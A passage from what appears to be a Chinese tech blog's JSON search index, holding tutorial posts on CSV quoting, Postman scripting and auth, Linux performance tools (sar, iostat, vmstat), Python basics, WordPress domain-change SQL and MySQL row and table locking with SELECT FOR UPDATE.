1: \"1\",&#125;mm := mfmt.Printf(\"%p\\n\", &amp;m) //0xc42002a028fmt.Printf(\"%p\\n\", &amp;mm) //0xc42002a030","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Format】csv","date":"2020-01-12T09:18:49.000Z","path":"2020/01/12/【Format】csv/","text":"一个奇怪的 Scenario如果你的机器上装了 Microsoft Excel 的话，.csv 文件默认是被 Excel 打开的。 需要注意的是，当你双击一个.csv 文件，Excel 打开它以后即使不做任何的修改，在关闭的时候 Excel 往往会提示是否要改成正确的文件格式，这个时候如果选择“是”，因为 Excel 认为.CSV 文件中的数字是要用科学记数法来表示的，Excel 会把 CSV 文件中所有的数字用科学计数来表示（2.54932E+5 这种形式），这样操作之后，只是在 Excel 中显示的时候会不正常，而 csv 文件由于是纯文本文件，在使用上没有影响；如果选择了“否”，那么会提示你以 xls 格式另存为 Excel 的一个副本。 所以，建议把 .csv 的默认打开方式改成任意一个文本编辑器。 , 问题由于逗号在 CSV 文件中特殊的作用，为了不至于产生歧义，在出现逗号的地方，需要用&quot;&quot;把这整个字段包裹起来。 举例说明 年 制造商 型号 说明 价值 1997 Ford E350 ac,abs,moon 3000.00 1999 Chevy Venture “Extended Edition” 4900.00 1999 Chevy Venture “Extended Edition， Very Large” 5000.00 1996 Jeep Grand Cherokee MUST SELL! air, moon roof, loaded 4799.00 上面表格内容若以 .csv格式表示就会是这样： 12345年,制造商,型号,说明,价值1997,Ford,E350,&quot;ac, abs, moon&quot;,3000.001999,Chevy,&quot;Venture &quot;&quot;Extended Edition&quot;&quot;&quot;,&quot;&quot;,4900.001999,Chevy,&quot;Venture &quot;&quot;Extended Edition, Very Large&quot;&quot;&quot;,&quot;&quot;,5000.001996,Jeep,Grand Cherokee,&quot;MUST SELL! air, moon roof, loaded&quot;,4799.00 以上这个CSV的例子说明了: 包含逗号、双引号、 或是换行符的字段必须放在引号内 字段内部的引号必须在其前面增加一个引号来实现引号的转义 分隔符逗号前后的空格 可能不会 被修剪掉，这是RFC 4180的要求 元素中的换行符将被保留下来 如果字段包含被嵌入的逗号，必须被包裹，比如： 11997,Ford,E350,&quot;ac, abs, moon&quot;,3000.00 每个被嵌入的双引号字符必须用两个双引号表示： 11999,Chevy,&quot;Venture &quot;&quot;Extended Edition&quot;&quot;&quot;,&quot;&quot;,4900.00","comments":true,"categories":[{"name":"Format","slug":"Format","permalink":"http://swsmile.info/categories/Format/"}],"tags":[{"name":"Format","slug":"Format","permalink":"http://swsmile.info/tags/Format/"}]},{"title":"【Software Testing】Postman 深入","date":"2019-12-09T13:50:44.000Z","path":"2019/12/09/【Software-Testing】Postman-深入/","text":"Environment环境变量 (Environment Variable) Globals (Global Variable)ScriptPre-request scripts在遇到有依赖的接口时，比如需要登录或者需要从前一个接口的结果中获取参数时，我们往往需要在该请求前先发送一下所依赖的请求，我们可以在Pre-request script中使用pm.sendRequest实现。 或者，我们的 API 使用一种在 Postman 中未定义的 Authentication 方式进行 auth（需要基于每次都基于 HTTP body 和 secretToken 计算出一个 signature，并把这个计算出的 signature 放在 HTTP 的 Header 中），这时候，就可以把这个计算 signature 的逻辑放在Pre-request scripts，从而进一步提高我们 API 测试的效率。 在 Pre-request scripts允许我们写任何的 JavaScript 代码，扩展性极强。 发送GET请求12345const url = 'http://115.28.108.130:5000/api/user/getToken/?appid=136425';// 发送get请求pm.sendRequest(url, function (err, res) &#123; console.log(err ? err : res.text()); // 控制台打印请求文本&#125;); 可以配合 pm.environment.set(key:value) 来将响应中的数据保存到环境变量中以供本次请求使用。示例（使用请求前脚本获取token并使用）： 发送表单格式Post请求1234567891011121314//构造一个登录请求const loginRequest = &#123; url: 'http://115.28.108.130:5000/api/user/login/', method: \"POST\", body: &#123; mode: 'urlencoded', // 模式为表单url编码模式 urlencoded: 'name=张三&amp;password=123456' &#125;&#125;;// 发送请求pm.sendRequest(loginRequest, function (err, res) &#123; console.log(err ? err : res.text());&#125;); 输出信息可以通过点击Postman菜单栏 -&gt;view-&gt; Show Postman Console，打开控制台查看（先打开控制台，再发送请求）。 使用HMAC SHA256核心代码： 12var hash = CryptoJS.HmacSHA256(\"Message\", \"secret\");var hashInBase64 = CryptoJS.enc.Base64.stringify(hash); https://www.jokecamp.com/blog/examples-of-creating-base64-hashes-using-hmac-sha256-in-different-languages/#js https://github.com/acquia/http-hmac-postman/blob/master/src/prerequestscript.js https://gist.github.com/DinoChiesa/75796b27828cf8e15c91 https://github.com/acquia/http-hmac-postman https://gist.github.com/DinoChiesa/75796b27828cf8e15c91 Authorization（授权）/ Authentication（认证）Inheriting authSpecifying authorization detailsAPI Key可以将一对 key-value添加在 Header 或者Query Params中。 Bearer token添加之后，Postman 会在 Header 中增加一个 key-value，其中 key 为 authorization，value 为Bearer JpywakNgvqVesTzBSeQ3scZewOj0oP Basic authBasic authentication involves sending a verified username and password with your request. In the request Authorization tab, select Basic Auth from the Type dropdown list. Enter your API login details in the Username and Password fields—for additional security you can store these in variables. Click Preview Request to see how Postman will append your basic auth details to the request. In the request Headers, you will see that the Authorization header is being passed a Base64 encoded string representing your username and password values, appended to the text “Basic “ as follows: 1Basic &lt;Base64 encoded username and password&gt; Digest authOAuth 1.0Mock ServerReference Authorization - https://learning.getpostman.com/docs/postman/sending-api-requests/authorization/ Postman Sandbox API reference - https://learning.getpostman.com/docs/postman/scripts/postman-sandbox-api-reference/ https://www.jianshu.com/p/b1b9a049f56a https://www.jianshu.com/p/9481387c7cd7","comments":true,"categories":[{"name":"SoftwareTesting","slug":"SoftwareTesting","permalink":"http://swsmile.info/categories/SoftwareTesting/"}],"tags":[{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【Linux】资源使用问题排查","date":"2019-12-09T11:26:59.000Z","path":"2019/12/09/【Linux】资源使用问题排查/","text":"总结要判断系统瓶颈问题，有时需几个 sar 命令选项结合起来； 怀疑CPU存在瓶颈，可用 sar -u 和 sar -q 等来查看 怀疑内存存在瓶颈，可用sar -B、sar -r 和 sar -W 等来查看 怀疑I/O存在瓶颈，可用 sar -b 和 sar -d 等来查看 监测工具`sar - 找出系统瓶颈的利器sar是System Activity Reporter（系统活动情况报告）的缩写。sar工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据；取样数据和分析的结果都可以存入文件，所需的负载很小。sar是目前Linux上最为全面的系统性能分析工具之一，可以从14个大方面对系统的活动进行报告，包括文件的读写情况、系统调用的使用情况、串口、CPU效率、内存使用状况、进程活动及IPC有关的活动等，使用也是较为复杂。 sar是查看操作系统报告指标的各种工具中，最为普遍和方便的；它有两种用法； 追溯过去的统计数据（默认） 周期性的查看当前数据 iostat - 监视I/O子系统iostat是I/O statistics（输入/输出统计）的缩写，用来动态监视系统的磁盘操作活动。 通过iostat方便查看CPU、网卡、tty设备、磁盘、CD-ROM 等等设备的活动情况, 负载信息。 命令参数 -C 显示CPU使用情况 -d 显示磁盘使用情况 -k 以 KB 为单位显示 -m 以 M 为单位显示 -N 显示磁盘阵列(LVM) 信息 -n 显示NFS 使用情况 -p[磁盘] 显示磁盘和分区的情况 -t 显示终端和CPU的信息 -x 显示详细信息 -V 显示版本信息 vmstat - 监视内存使用情况vmstat是Virtual Meomory Statistics（虚拟内存统计）的缩写，可实时动态监视操作系统的虚拟内存、进程、CPU活动。 vmstat的语法1$ vmstat [-V] [-n] [delay [count]] -V表示打印出版本信息； -n表示在周期性循环输出时，输出的头部信息仅显示一次； delay是两次输出之间的延迟时间； count是指按照这个时间间隔统计的次数。 123456$vmstat 5 5procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu-----r b swpd free buff cache si so bi bo in cs us sy id wa st6 0 0 27900472 204216 28188356 0 0 0 9 1 2 11 14 75 0 09 0 0 27900380 204228 28188360 0 0 0 13 33312 126221 22 20 58 0 02 0 0 27900340 204240 28188364 0 0 0 10 32755 125566 22 20 58 0 0 字段说明 Procs（进程）: r: 运行队列中进程数量 b: 等待IO的进程数量 Memory（内存）: swpd: 使用虚拟内存大小 free: 可用内存大小 buff: 用作缓冲的内存大小 cache: 用作缓存的内存大小 Swap: si: 每秒从交换区写到内存的大小 so: 每秒写入交换区的内存大小 IO：（现在的Linux版本块的大小为1024bytes） bi: 每秒读取的块数 bo: 每秒写入的块数 system： in: 每秒中断数，包括时钟中断 cs: 每秒上下文切换数 CPU（以百分比表示） us: 用户进程执行时间(user time) sy: 系统进程执行时间(system time) id: 空闲时间(包括IO等待时间) wa: 等待IO时间 查看 CPU使用top1$ top 查看已经被使用的内存比例、暂用内存较多的进程。 sar -u 可以看到这台机器使用了虚拟化技术，有相应的时间消耗； 各列的指标分别是: %user 用户模式下消耗的CPU时间的比例； %nice 通过nice改变了进程调度优先级的进程，在用户模式下消耗的CPU时间的比例 %system 系统模式下消耗的CPU时间的比例； %iowait CPU等待磁盘I/O导致空闲状态消耗的时间比例； %steal 利用Xen等操作系统虚拟化技术，等待其它虚拟CPU计算占用的时间比例； %idle CPU空闲时间比例； 查看进程负载 - sar -qsar -q: 查看平均负载，即查看运行队列中的进程数、系统上的进程大小、平均负载等；与其它命令相比，它能查看各项指标随时间变化的情况； runq-sz：运行队列的长度（等待运行的进程数） plist-sz：进程列表中进程（processes）和线程（threads）的数量 ldavg-1：最后1分钟的系统平均负载 ldavg-5：过去5分钟的系统平均负载 ldavg-15：过去15分钟的系统平均负载 查看 Memory 使用 - sar -rsar -r： 指定-r之后，可查看物理内存使用状况： 123456789101112$ sar -r 1 3... 05/07/2020 _x86_64_ (1 CPU)08:16:42 AM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty08:16:43 AM 260984 730648 73.68 28252 179944 2226192 177.56 407532 153884 008:16:44 AM 260792 730840 73.70 28252 179944 2226192 177.56 407536 153884 008:16:45 AM 260792 730840 73.70 28252 179944 2226192 177.56 407544 153884 0Average: 260856 730776 73.69 28252 179944 2226192 177.56 407537 153884 0$ free total used free shared buff/cache availableMem: 991632 433948 260872 9736 296812 360060Swap: 262140 118760 143380 kbmemfree：这个值和free命令中的free值基本一致，所以它不包括buffer和cache的空间 kbmemused：这个值和free命令中的used值基本一致，所以它包括buffer和cache的空间 %memused：物理内存使用率，这个值是kbmemused和内存总量(不包括swap)的一个百分比 kbbuffers和kbcached：这两个值就是free命令中的buffer和cache kbcommit：保证当前系统所需要的内存,，即为了确保不溢出而需要的内存(RAM+swap) %commit：这个值是kbcommit与内存总量(包括swap)的一个百分比 查看页面交换发生状况 - sar -Wsar -W：查看页面交换发生状况 页面发生交换时，服务器的吞吐量会大幅下降；服务器状况不良时，如果怀疑因为内存不足而导致了页面交换的发生，可以使用这个命令来确认是否发生了大量的交换； 12345$ sar -W08:00:01 AM pswpin/s pswpout/s08:10:01 AM 0.00 0.0008:20:01 AM 0.00 0.00Average: 0.00 0.00 pswpin/s：每秒系统换入的交换页面（swap page）数量 pswpout/s：每秒系统换出的交换页面（swap page）数量 Memory问题 - dmesg1$ sudo dmesg 可以查看是否有进程因为 OOM（out-of memory）被OOM killer kill 掉。 虚拟内存 - vmstat查看 I/ODiskiostat1234567$ iostat -x 1avg-cpu: %user %nice %system %iowait %steal %idle 0.39 0.00 0.29 0.06 0.10 99.16Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 9.52 985.85 1.74 16661069135 29469080sdb 0.12 0.50 0.62 8404000 10533796 查看当前读和写 I/O 是不是很高。 CPP\\U属性值说明： %user：CPU处在用户模式下的时间百分比。%nice：CPU处在带NICE值的用户模式下的时间百分比。%system：CPU处在系统模式下的时间百分比。%iowait：CPU等待输入输出完成时间的百分比。%steal：管理程序维护另一个虚拟处理器时，虚拟CPU的无意识等待时间百分比。%idle：CPU空闲时间百分比。 注：如果%iowait的值过高，表示硬盘存在I/O瓶颈，%idle值高，表示CPU较空闲，如果%idle值高但系统响应慢时，有可能是CPU等待分配内存，此时应加大内存容量。%idle值如果持续低于10，那么系统的CPU处理能力相对较低，表明系统中最需要解决的资源是CPU。 disk属性值说明： rrqm/s: 每秒进行 merge 的读操作数目。即 rmerge/swrqm/s: 每秒进行 merge 的写操作数目。即 wmerge/sr/s: 每秒完成的读 I/O 设备次数。即 rio/sw/s: 每秒完成的写 I/O 设备次数。即 wio/srsec/s: 每秒读扇区数。即 rsect/swsec/s: 每秒写扇区数。即 wsect/srkB/s: 每秒读K字节数。是 rsect/s 的一半，因为每扇区大小为512字节。wkB/s: 每秒写K字节数。是 wsect/s 的一半。avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。avgqu-sz: 平均I/O队列长度。await: 平均每次设备I/O操作的等待时间 (毫秒)。svctm: 平均每次设备I/O操作的服务时间 (毫秒)。%util: 一秒中有百分之多少的时间用于 I/O 操作，即被io消耗的cpu百分比 备注：如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 svctm，说明I/O 队列太长，io响应太慢，则需要进行必要优化。如果avgqu-sz比较大，也表示有当量io在等待。 sar -d网络测试TCP的RTT时间123456789101112$ ping aaa.comPING aaa.com (10.1.2.3) 56(84) bytes of data.64 bytes from 10.1.2.3: icmp_seq=1 ttl=61 time=0.104 ms64 bytes from 10.1.2.3: icmp_seq=2 ttl=61 time=0.097 ms64 bytes from 10.1.2.3: icmp_seq=3 ttl=61 time=0.103 ms64 bytes from 10.1.2.3: icmp_seq=4 ttl=61 time=0.116 ms64 bytes from 10.1.2.3: icmp_seq=5 ttl=61 time=0.086 ms64 bytes from 10.1.2.3: icmp_seq=6 ttl=61 time=0.101 ms64 bytes from 10.1.2.3: icmp_seq=7 ttl=61 time=0.086 ms64 bytes from 10.1.2.3: icmp_seq=8 ttl=61 time=0.095 ms64 bytes from 10.1.2.3: icmp_seq=9 ttl=61 time=0.091 ms64 bytes from 10.1.2.3: icmp_seq=10 ttl=61 time=0.092 ms 输出显示每个包的往返时间（round trip time，RTT）并总结各种统计信息。由于时间戳是由ping命令自己计量的，其中包括获取时间戳到处理网络 I/O 的整个 CPU 代码路径执行时间。 与应用程序协议相比，路由器可能以较低的优先级处理 ICMP 数据包，因而延时可能比通常情况下有更高的波动。 sar -n DEV -n DEV***：***网络接口统计信息。 -n EDEV***：***网络接口错误。 -n IP***：***IP 数据报统计信息。 -n EIP***：***IP 错误统计信息。 -n TCP***：***TCP 统计信息。 -n ETCP***：***TCP 错误统计信息。 -n SOCK***：***套接字使用。 提供的统计信息见下表。 选项 统计信息 描述 单位 -n DEV rxpkg/s 接收的数据包 数据包 /s -n DEV txpkt/s 传输的数据包 数据包 /s -n DEV rxkB/s 接收的千字节 千字节 /s -n DEV txkB/s 传输的千字节 千字节 /s -n EDEV rxerr/s 接收数据包错误 数据包 /s -n EDEV txerr/s 传输数据包错误 数据包 /s -n EDEV coll/s 碰撞 数据包 /s -n EDEV rxdrop/s 接收数据包丢包（缓冲满） 数据包 /s -n EDEV txdrop/s 传输数据包丢包（缓冲满） 数据包 /s -n EDEV rxfifo/s 接收的数据包 FIFO 超限错误 数据包 /s -n EDEV txfifo/s 传输的数据包 FIFO 超限错误 数据包 /s -n IP irec/s 输入的数据报文（接收） 数据报文 /s -n IP fwddgm/s 转发的数据报文 数据报文 /s -n IP orq/s 输出的数据报文请求（传输） 数据报文 /s -n EIP idisc/s 输入的丢弃（例如，缓冲满） 数据报文 /s -n EIP odisc/s 输出的丢弃（例如，缓冲满） 数据报文 /s -n TCP active/s 新的主动 TCP 连接（connect()） 连接数 /s -n TCP active/s 新的被动 TCP 连接（listen()） 连接数 /s -n TCP active/s 输入的段（接收） 段 /s -n TCP active/s 输出的段（接收） 段 /s -n ETCP active/s 主动 TCP 失败连接 连接数 /s -n ETCP active/s TCP 段重传 段 /s -n SOCK totsck 使用中的总数据包 sockets -n SOCK ip-frag 当前队列中的 IP 数据片 fragments -n SOCK tcp-tw TIME-WAIT 中的 TCP 套接字 sockets Reference https://www.opsdash.com/blog/disk-monitoring-linux.html https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/sar.html https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/iostat.html https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/vmstat.html https://www.infoq.cn/article/linux-networking-performance-analytics","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Python】显示对象的所有 Attribute","date":"2019-12-06T08:35:15.000Z","path":"2019/12/06/【Python】显示对象的所有-Attribute/","text":"dir12345678910my_list = [1, 2, 3]dir(my_list)# Output: ['__add__', '__class__', '__contains__', '__delattr__', '__delitem__',# '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__',# '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__',# '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__',# '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__',# '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__',# '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop',# 'remove', 'reverse', 'sort'] inspect moduleThe inspect module also provides several useful functions to get information about live objects. For example you can check the members of an object by running: 123import inspectprint(inspect.getmembers(str))# Output: [('__add__', &lt;slot wrapper '__add__' of ... ... Inheritance Of AttributesBefore opening this topic, let’s take a look at the built-in __dict__ attribute. 12345678class Example: classAttr = 0 def __init__(self, instanceAttr): self.instanceAttr = instanceAttra = Example(1)print(a.__dict__)print(Example.__dict__)Output:&#123;'instanceAttr': 1&#125;&#123;'__module__': '__main__', '__doc__': None, '__dict__': &lt;attribute '__dict__' of 'Example' objects&gt;, '__init__': &lt;function Example.__init__ at 0x7f8af2113f28&gt;, 'classAttr': 0, '__weakref__': &lt;attribute '__weakref__' of 'Example' objects&gt;&#125; Reference https://book.pythontips.com/en/latest/object_introspection.html https://medium.com/swlh/class-and-object-attributes-python-8191dcd1f4cf https://stackoverflow.com/questions/192109/is-there-a-built-in-function-to-print-all-the-current-properties-and-values-of-a","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】print","date":"2019-12-01T13:16:03.000Z","path":"2019/12/01/【Python】print/","text":"基础用法print语句可以向屏幕上输出指定的文字例如： 1print &apos;Hello World!&apos; print语句也可以跟上多个字符串，用逗号“,”隔开，就可以连成一串输出ps：print会依次打印每个字符串，遇到逗号“,”会输出一个空格 例如： 123print &apos;my&apos;,&apos;name&apos;,&apos;is&apos;,&apos;Jacky&apos;输出为：my name is Jacky print语句也可以跟上多个字符串，若无”,”，或者手动空格，都是无法在拼接时显示空格的1234print &apos;my&apos;&apos;name&apos;&apos;is&apos;&apos;Jacky&apos;print &apos;my&apos; &apos;name&apos; &apos;is&apos; &apos;Jacky&apos;输出为：mynameisTom print也可以用来打印数值或者是计算结果12print 100print 100 * 300 print中字符串和数字之间需要用”,”来连接。ps：如果不用”,”来连接，则会报错SyntaxError: invalid syntax 12print &apos;hello：&apos;, 100print &quot;三位数依次为：&quot;, numList 格式化输出格式化输出是指通过print等函数向指定的地方（例如屏幕，文件）输出指定格式的内容. 例如：%d 输出整数，%s 输出字符串。%s、%d、%f是占位符 打印字符串以下三种方式都可以输出格式化的字符串 1234567print (&quot;His name is %s&quot;%(&quot;www&quot;))print &quot;His name is %s&quot; % (&quot;jacky&quot;)print &quot;His name is %s&quot; % &quot;who&quot;输出为：His name is wwwHis name is jackyHis name is who 打印整数12345678910%d –只能对应int类print (&quot;He is %d years old&quot;) % (25)输出为：He is 25 years olda = 3.1415926print &quot;%d&quot; %a输出为：3 打印浮点数12345678a = 3.1415926print &quot;%f&quot; %a输出为：3.1415931234 打印浮点数（指定保留小数点位数）12345678a = 3.1415926print &quot;%.2f&quot; %a #按照要求输出小数位数输出为：3.14print &quot;%.9f&quot; %a #如果要求的小数位数过多，后面就用0补全输出为：3.141592600 Reference https://blog.csdn.net/liangxy2014/article/details/79116267","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】断言（assert）","date":"2019-12-01T12:30:18.000Z","path":"2019/12/01/【Python】断言/","text":"Python assert（断言）用于判断一个表达式，在表达式条件为 false 的时候触发异常。 断言可以在条件不满足程序运行的情况下直接返回错误，而不必等待程序运行后出现崩溃的情况，例如我们的代码只能在 Linux 系统下运行，可以先判断当前系统是否符合条件。 语法格式如下： 1assert expression 等价于： 12if not expression: raise AssertionError assert 后面也可以紧跟参数: 1assert expression [, arguments] 等价于： 12if not expression: raise AssertionError(arguments) 以下为 assert 使用实例： 12345678910111213141516&gt;&gt;&gt; assert True # 条件为 true 正常执行&gt;&gt;&gt; assert False # 条件为 false 触发异常Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;AssertionError&gt;&gt;&gt; assert 1==1 # 条件为 true 正常执行&gt;&gt;&gt; assert 1==2 # 条件为 false 触发异常Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;AssertionError&gt;&gt;&gt; assert 1==2, '1 不等于 2'Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;AssertionError: 1 不等于 2&gt;&gt;&gt; 实例以下实例判断当前系统是否为 Linux，如果不满足条件则直接触发异常，不必执行接下来的代码： 1234import sysassert ('linux' in sys.platform), \"改代码只能在 Linux 下执行\"# 接下来要执行的代码 Reference https://docs.python.org/3/reference/simple_stmts.html#assert https://www.runoob.com/python3/python3-assert.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【WordPress】修改站点域名","date":"2019-12-01T08:45:24.000Z","path":"2019/12/01/【WordPress】修改站点域名/","text":"1234UPDATE wp_options SET option_value = replace(option_value, 'uomaa.cn','uomaa.org.cn') ;UPDATE wp_posts SET post_content = replace(post_content, 'uomaa.cn','uomaa.org.cn') ;UPDATE wp_comments SET comment_content = replace(comment_content, 'uomaa.cn', 'uomaa.org.cn') ;UPDATE wp_comments SET comment_author_url = replace(comment_author_url, 'uomaa.cn', 'uomaa.org.cn') ;","comments":true,"categories":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/categories/WordPress/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/tags/WordPress/"}]},{"title":"【Python】常见错误","date":"2019-11-28T09:17:39.000Z","path":"2019/11/28/【Python】常见错误/","text":"Variable未定义的 variable1234&gt;&gt;&gt; len(abc)Traceback (most recent call last): File \"&lt;console&gt;\", line 1, in &lt;module&gt;NameError: name 'abc' is not defined Dict不存在的 Key12345&gt;&gt;&gt; a = &#123;&#125;&gt;&gt;&gt; a[\"s\"]Traceback (most recent call last): File \"&lt;console&gt;\", line 1, in &lt;module&gt;KeyError: 's' Function未定义的函数1234&gt;&gt;&gt; fun()Traceback (most recent call last): File \"&lt;console&gt;\", line 1, in &lt;module&gt;NameError: name 'fun' is not defined 12345&gt;&gt;&gt; a = None&gt;&gt;&gt; a()Traceback (most recent call last): File \"&lt;console&gt;\", line 1, in &lt;module&gt;TypeError: 'NoneType' object is not callable","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【SQL】select for update","date":"2019-11-26T11:30:39.000Z","path":"2019/11/26/【SQL】select-for-update/","text":"MySQL InnoDB 排他锁用法： 1select … for update; 例如： 1select * from goods where id = 1 for update; 排他锁的申请前提：没有线程对该结果集中的任何行数据使用排他锁或共享锁，否则申请会阻塞。 for update仅适用于InnoDB，且必须在事务块(BEGIN/COMMIT)中才能生效。在进行事务操作时，通过“for update”语句，MySQL会对查询结果集中每行数据都添加排他锁，其他线程对该记录的更新与删除操作都会阻塞。排他锁包含行锁、表锁。 场景分析假设有一张商品表 goods，它包含 id，商品名称，库存量三个字段，表结构如下： 1234567CREATE TABLE `goods` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(100) DEFAULT NULL, `stock` int(11) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `idx_name` (`name`) USING HASH) ENGINE=InnoDB 插入如下数据： 123456789INSERT INTO `goods` VALUES ('1', 'prod11', '1000');INSERT INTO `goods` VALUES ('2', 'prod12', '1000');INSERT INTO `goods` VALUES ('3', 'prod13', '1000');INSERT INTO `goods` VALUES ('4', 'prod14', '1000');INSERT INTO `goods` VALUES ('5', 'prod15', '1000');INSERT INTO `goods` VALUES ('6', 'prod16', '1000');INSERT INTO `goods` VALUES ('7', 'prod17', '1000');INSERT INTO `goods` VALUES ('8', 'prod18', '1000');INSERT INTO `goods` VALUES ('9', 'prod19', '1000'); 数据一致性问题假设有A、B两个用户同时各购买一件 id=1 的商品，用户A获取到的库存量为 1000，用户B获取到的库存量也为 1000，用户A完成购买后修改该商品的库存量为 999，用户B完成购买后修改该商品的库存量为 999，此时库存量数据产生了不一致。 有两种解决方案： 悲观锁方案每次获取商品时，对该商品加排他锁。也就是在用户A获取获取 id=1 的商品信息时对该行记录加锁，期间其他用户阻塞等待访问该记录。悲观锁适合写入频繁的场景。 123456# 开始事务begin;select * from goods where id = 1 for update;update goods set stock = stock - 1 where id = 1;# 提交事务commit; 乐观锁方案每次获取商品时，不对该商品加锁。在更新数据的时候需要比较程序中的库存量与数据库中的库存量是否相等，如果相等则进行更新，反之程序重新获取库存量，再次进行比较，直到两个库存量的数值相等才进行数据更新。乐观锁适合读取频繁的场景。 12345678#不加锁获取 id=1 的商品对象select * from goods where id = 1begin;#更新 stock 值，这里需要注意 where 条件 “stock = cur_stock”，只有程序中获取到的库存量与数据库中的库存量相等才执行更新update goods set stock = stock - 1 where id = 1 and stock = cur_stock;commit; 如果我们需要设计一个商城系统，该选择以上的哪种方案呢？ 查询商品的频率比下单支付的频次高，基于以上我可能会优先考虑第二种方案（当然还有其他的方案，这里只考虑以上两种方案）。 行锁与表锁只根据主键进行查询，并且查询到数据，主键字段产生行锁。 123begin;select * from goods where id = 1 for update;commit; 只根据主键进行查询，没有查询到数据，不产生锁。 123begin;select * from goods where id = 1 for update;commit; 根据主键、非主键含索引（name）进行查询，并且查询到数据，主键字段产生行锁，name字段产生行锁。 123begin;select * from goods where id = 1 and name=&apos;prod11&apos; for update;commit; 根据主键、非主键含索引（name）进行查询，没有查询到数据，不产生锁。 123begin;select * from goods where id = 1 and name=&apos;prod12&apos; for update;commit; 根据主键、非主键不含索引（name）进行查询，并且查询到数据，如果其他线程按主键字段进行再次查询，则主键字段产生行锁，如果其他线程按非主键不含索引字段进行查询，则非主键不含索引字段产生表锁，如果其他线程按非主键含索引字段进行查询，则非主键含索引字段产生行锁，如果索引值是枚举类型，mysql也会进行表锁，这段话有点拗口，大家仔细理解一下。 123begin;select * from goods where id = 1 and name=&apos;prod11&apos; for update;commit; 根据主键、非主键不含索引（name）进行查询，没有查询到数据，不产生锁。 123begin;select * from goods where id = 1 and name=&apos;prod12&apos; for update;commit; 根据非主键含索引（name）进行查询，并且查询到数据，name字段产生行锁。 123begin;select * from goods where name=&apos;prod11&apos; for update;commit; 根据非主键含索引（name）进行查询，没有查询到数据，不产生锁。 123begin;select * from goods where name=&apos;prod11&apos; for update;commit; 根据非主键不含索引（name）进行查询，并且查询到数据，name字段产生表锁。 123begin;select * from goods where name=&apos;prod11&apos; for update;commit; 根据非主键不含索引（name）进行查询，没有查询到数据，name字段产生表锁。 123begin;select * from goods where name=&apos;prod11&apos; for update;commit; 只根据主键进行查询，查询条件为不等于，并且查询到数据，主键字段产生表锁。 123begin;select * from goods where id &lt;&gt; 1 for update;commit; 只根据主键进行查询，查询条件为不等于，没有查询到数据，主键字段产生表锁。 123begin;select * from goods where id &lt;&gt; 1 for update;commit; 只根据主键进行查询，查询条件为 like，并且查询到数据，主键字段产生表锁。 123begin;select * from goods where id like &apos;1&apos; for update;commit; 只根据主键进行查询，查询条件为 like，没有查询到数据，主键字段产生表锁。 123begin;select * from goods where id like &apos;1&apos; for update;commit; Reference https://blog.csdn.net/claram/article/details/54023216","comments":true,"categories":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://swsmile.info/tags/SQL/"}]},{"title":"【Python】Basics - 特殊变量（Special Variables）","date":"2019-11-26T04:21:42.000Z","path":"2019/11/26/【Python】Basics-特殊变量/","text":"类似__xx__，以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，它不是private变量。 __doc__ 属性 - 定义文档字符串 __dict__ 属性 - 类的属性列表 __class__ 属性 - 返回当前类对应的变量 __slots__ 属性 - 在运行时对类的实例动态绑定属性和方法 __name__属性 - 返回当前类的类名（以字符串描述） __slots__ 属性 - 在运行时对类的实例动态绑定属性和方法12345678910111213141516from types import MethodTypedef set_age(self, age): self.age = age class P(object): passp = P() p.name = 'chenqi'# 在运行时为这个类的实例绑定一个方法，但仅限于这个类实例（其他类实例仍然没有这个方法）p.set_age = MethodType(set_age, p, P) p.set_age(31)print p.nameprint 